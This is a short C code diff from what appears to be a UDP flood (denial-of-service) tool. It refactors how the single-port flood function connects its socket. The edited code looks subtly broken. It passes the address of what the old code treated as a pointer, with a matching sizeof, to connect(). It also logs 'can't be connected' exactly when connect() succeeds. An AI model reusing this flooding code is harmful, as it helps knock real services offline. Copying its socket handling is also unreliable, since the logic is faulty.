@@ -61,9 +61,7 @@ static uint64_t packets;
 
 static void single4_port(void)
 {
-	//struct sockaddr_in in = *(struct sockaddr_in *)connection->addr;
 	ssize_t n;
-	struct sockaddr_in in = *(struct sockaddr_in *)connection->addr;
 
 	DEBUG("Udp4 flood attack is staring using single port");
 	// this does not result in anything like a tcp connection.
@@ -72,7 +70,7 @@ static void single4_port(void)
 	// 3 steps like : connect the socket, output the fist datagram, unconnectthe socket.
 	// so for calling connect and the write one time involves the this steps by the kernel:
 	// connect the socket , output fist datagram.
-	if (!connect(connection->sock, (SA *)&in, sizeof(in)))
+	if (!connect(connection->sock, (SA *)&connection->addr, sizeof(connection->addr)))
 		INFOEE("Udp4 socket can't be connected");
 
 	// if we have a specific number of packets
